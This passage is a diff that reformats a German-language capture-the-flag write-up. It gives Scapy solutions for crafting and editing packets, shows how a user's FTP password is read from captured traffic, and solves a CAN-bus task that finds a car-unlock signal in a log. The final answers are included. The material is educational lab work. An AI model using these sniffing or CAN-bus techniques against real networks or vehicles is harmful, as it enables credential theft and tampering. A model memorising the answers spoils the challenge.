 <pre><code class="python">pkt = UDP_PACKETS[0]
 pkt[IP].dst = "127.0.0.1"
 task.submit(pkt)
 </code></pre>
 
-<h4 id="task-10">
-<a class="anchor" href="#task-10" aria-hidden="true"><span class="octicon octicon-link"></span></a>Task 10</h4>
+#### Task 10
 
-<blockquote>
-  <p>Submit the password “task.submit(‘elf_password’)” of the user alabaster as found in the packet list TCP_PACKETS.</p>
-</blockquote>
+&gt;Submit the password "task.submit('elf_password')" of the user alabaster as found in the packet list TCP_PACKETS.
 
 <pre><code class="python">&gt;&gt;&gt; TCP_PACKETS[3][Raw].load
 b'220 North Pole FTP Server\r\n'
@@ -1990,59 +1719,42 @@ b'230 User alabaster logged in.\r'
 task.submit("echo")
 </code></pre>
 
-<h4 id="task-11">
-<a class="anchor" href="#task-11" aria-hidden="true"><span class="octicon octicon-link"></span></a>Task 11</h4>
+#### Task 11
 
-<blockquote>
-  <p>The ICMP_PACKETS variable contains a packet list of several icmp echo-request and icmp echo-reply packets. Submit only the ICMP chksum value from the second packet in the ICMP_PACKETS list.</p>
-</blockquote>
+&gt;The ICMP_PACKETS variable contains a packet list of several icmp echo-request and icmp echo-reply packets. Submit only the ICMP chksum value from the second packet in the ICMP_PACKETS list.
 
 <pre><code class="python">task.submit(ICMP_PACKETS[1][ICMP].chksum)
 </code></pre>
 
-<h4 id="task-12">
-<a class="anchor" href="#task-12" aria-hidden="true"><span class="octicon octicon-link"></span></a>Task 12</h4>
+#### Task 12
 
-<blockquote>
-  <p>Submit the number of the choice below that would correctly create a ICMP echo request packet with a destination IP of 127.0.0.1 stored in the variable named “pkt”</p>
-  <ol>
-    <li>pkt = Ether(src=’127.0.0.1’)/ICMP(type=”echo-request”)</li>
-    <li>pkt = IP(src=’127.0.0.1’)/ICMP(type=”echo-reply”)</li>
-    <li>pkt = IP(dst=’127.0.0.1’)/ICMP(type=”echo-request”)</li>
-  </ol>
-</blockquote>
+&gt;Submit the number of the choice below that would correctly create a ICMP echo request packet with a destination IP of 127.0.0.1 stored in the variable named "pkt"
+&gt;1. pkt = Ether(src='127.0.0.1')/ICMP(type="echo-request")
+&gt;2. pkt = IP(src='127.0.0.1')/ICMP(type="echo-reply")
+&gt;3. pkt = IP(dst='127.0.0.1')/ICMP(type="echo-request")
 
 <pre><code class="python">task.submit(3)
 </code></pre>
 
-<h4 id="task-13">
-<a class="anchor" href="#task-13" aria-hidden="true"><span class="octicon octicon-link"></span></a>Task 13</h4>
+#### Task 13
 
-<blockquote>
-  <p>Create and then submit a UDP packet with a dport of 5000 and a dst IP of 127.127.127.127. (all other packet attributes can be unspecified)</p>
-</blockquote>
+&gt;Create and then submit a UDP packet with a dport of 5000 and a dst IP of 127.127.127.127. (all other packet attributes can be unspecified)
 
 <pre><code class="python">pkt = Ether()/IP(dst='127.127.127.127')/UDP(dport=5000)
 task.submit(pkt)
 </code></pre>
 
-<h4 id="task-14">
-<a class="anchor" href="#task-14" aria-hidden="true"><span class="octicon octicon-link"></span></a>Task 14</h4>
+#### Task 14
 
-<blockquote>
-  <p>Create and then submit a UDP packet with a dport of 53, a dst IP of 127.2.3.4, and is a DNS query with a qname of “elveslove.santa”. (all other packet attributes can be unspecified)</p>
-</blockquote>
+&gt;Create and then submit a UDP packet with a dport of 53, a dst IP of 127.2.3.4, and is a DNS query with a qname of "elveslove.santa". (all other packet attributes can be unspecified)
 
 <pre><code class="python">pkt = IP(dst='127.2.3.4')/UDP(dport=53)/DNS(qd=DNSQR(qname='elveslove.santa'))
 task.submit(pkt)
 </code></pre>
 
-<h4 id="task-15">
-<a class="anchor" href="#task-15" aria-hidden="true"><span class="octicon octicon-link"></span></a>Task 15</h4>
+#### Task 15
 
-<blockquote>
-  <p>The variable ARP_PACKETS contains an ARP request and response packets. The ARP response (the second packet) has 3 incorrect fields in the ARP layer. Correct the second packet in ARP_PACKETS to be a proper ARP response and then task.submit(ARP_PACKETS) for inspection.</p>
-</blockquote>
+&gt;The variable ARP_PACKETS contains an ARP request and response packets. The ARP response (the second packet) has 3 incorrect fields in the ARP layer. Correct the second packet in ARP_PACKETS to be a proper ARP response and then task.submit(ARP_PACKETS) for inspection.
 
 <pre><code class="python">&gt;&gt;&gt; ARP_PACKETS[Ether][0]
 &lt;Ether  dst=ff:ff:ff:ff:ff:ff src=00:16:ce:6e:8b:24 type=ARP |&lt;ARP  hwtype=0x1 ptype=IPv4 hwlen=6 plen=4 op=who-has hwsrc=00:16:ce:6e:8b:24 psrc=192.168.0.114 hwdst=00:00:00:00:00:00 pdst=192.168.0.1 |&gt;&gt;
@@ -2063,13 +1775,12 @@ ARP_PACKETS[1].hwsrc='00:13:46:0b:22:ba'
 task.submit(ARP_PACKETS)
 </code></pre>
 
-<h3 id="can-bus-investigation">
-<a class="anchor" href="#can-bus-investigation" aria-hidden="true"><span class="octicon octicon-link"></span></a>CAN-Bus Investigation</h3>
+### CAN-Bus Investigation
 
-<p>Um das Unlock-Signal zu finden schaue dir <code class="language-plaintext highlighter-rouge">candump.log</code> an.</p>
+Um das Unlock-Signal zu finden schaue dir `candump.log` an.
 
-<p>Es gibt 3 verschiedene ID Codes. Ein Code ist 3 mal vorhanden genau wie 
-in der Bechreibung erwähnt (Lock-Unlock-Lock).</p>
+Es gibt 3 verschiedene ID Codes. Ein Code ist 3 mal vorhanden genau wie 
+in der Bechreibung erwähnt (Lock-Unlock-Lock).
 
 <pre><code class="bash">cut -b 27-29 candump.log | sort | uniq -c
      35 188
@@ -2077,7 +1788,7 @@ in der Bechreibung erwähnt (Lock-Unlock-Lock).</p>
    1331 244
 </code></pre>
 
-<p>Analysiere die Werte dieses ID Codes um den Timestamp zu finden:</p>
+Analysiere die Werte dieses ID Codes um den Timestamp zu finden:
 
 <pre><code class="bash">grep -E '^.*vcan0\s(19B).*$' candump.log 
 (1608926664.626448) vcan0 19B#000000000000
@@ -2087,17 +1798,19 @@ in der Bechreibung erwähnt (Lock-Unlock-Lock).</p>
 ./runanswer -&gt; 122520
 </code></pre>
 
-<div style="padding:56.25% 0 0 0;position:relative;">
-  <iframe src="https://player.vimeo.com/video/498981563" style="position:absolute;top:0;left:0;width:100%;height:100%;" frameborder="0" allow="autoplay; fullscreen" allowfullscreen=""></iframe>
-</div>
+<div style="padding:56.25% 0 0 0;position:relative;"><iframe src="https://player.vimeo.com/video/498981563" style="position:absolute;top:0;left:0;width:100%;height:100%;" frameborder="0" allow="autoplay; fullscreen" allowfullscreen=""></iframe></div>
 <script src="https://player.vimeo.com/api/player.js"></script>
-
 <p>Videobeschreibung unter <a href="https://player.vimeo.com/video/498981563" target="_blank" rel="noopener noreferrer">https://player.vimeo.com/video/498981563</a></p>
 
-<p>Lösung:</p>
+Lösung:
 
-<p><strong>122520</strong></p>
+**122520**
 
+
+
+
+
+</encrypted>
 
             </div>
         </div>
